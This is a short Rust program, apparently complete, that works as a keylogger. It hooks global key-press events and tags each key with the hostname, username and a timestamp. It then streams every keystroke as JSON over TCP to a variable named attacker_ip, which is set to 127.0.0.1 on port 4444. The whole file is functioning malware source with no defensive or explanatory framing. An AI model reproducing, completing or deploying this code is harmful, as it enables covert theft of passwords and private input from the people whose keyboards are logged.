use rdev::{listen, Event, EventType};
use hostname::get;
use whoami;
use chrono::Local;
use std::net::TcpStream;
use std::io::Write;

fn main() {
    println!("[*] Keylogger started...");

    let attacker_ip = "127.0.0.1";
    let attacker_port = "4444";

    let mut stream = match TcpStream::connect(format!("{}:{}", attacker_ip, attacker_port)) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[-] Failed to connect to attacker: {}", e);
            return;
        }
    };

    let hostname = get().unwrap().into_string().unwrap_or("unknown".into());
    let username = whoami::username();

    let _ = listen(move |event: Event| {
        if let EventType::KeyPress(key) = event.event_type {
            let timestamp = Local::now();
            let message = format!(
                "{{\"time\":\"{}\", \"user\":\"{}\", \"host\":\"{}\", \"key\":\"{:?}\"}}",
                timestamp.format("%Y-%m-%d %H:%M:%S"),
                username,
                hostname,
                key
            );

            let _ = writeln!(stream, "{}", message);
        }
    });
}

